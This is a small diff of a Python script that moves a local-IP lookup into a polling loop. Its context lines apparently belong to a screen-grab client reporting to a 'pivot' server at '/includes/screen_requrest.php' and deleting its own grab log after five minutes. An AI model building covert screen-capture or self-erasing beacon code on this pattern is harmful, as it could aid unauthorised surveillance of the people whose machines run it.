@@ -24,13 +24,6 @@ except FileNotFoundError:
 log.write("arch: " + arch.decode())
 server_path = "/includes/screen_requrest.php"
 log.write("server path: " + str(server_path) + "\n")
-while True:
-    try:
-        hostname = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_STREAM)]][0][1]
-        break
-    except OSError:
-        pass
-log.write("hostname: " + str(hostname) + "\n")
 server_ip = "pivot"
 en = False
 _time = 5
@@ -40,6 +33,7 @@ headers = {'Content-type': 'application/json'}
 
 while arch:
     try:
+        hostname = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_STREAM)]][0][1]
         if time.time() - begin > 300:
             log.close()
             subprocess.run(['rm', '{}-grab_log.txt'.format(logtime)])
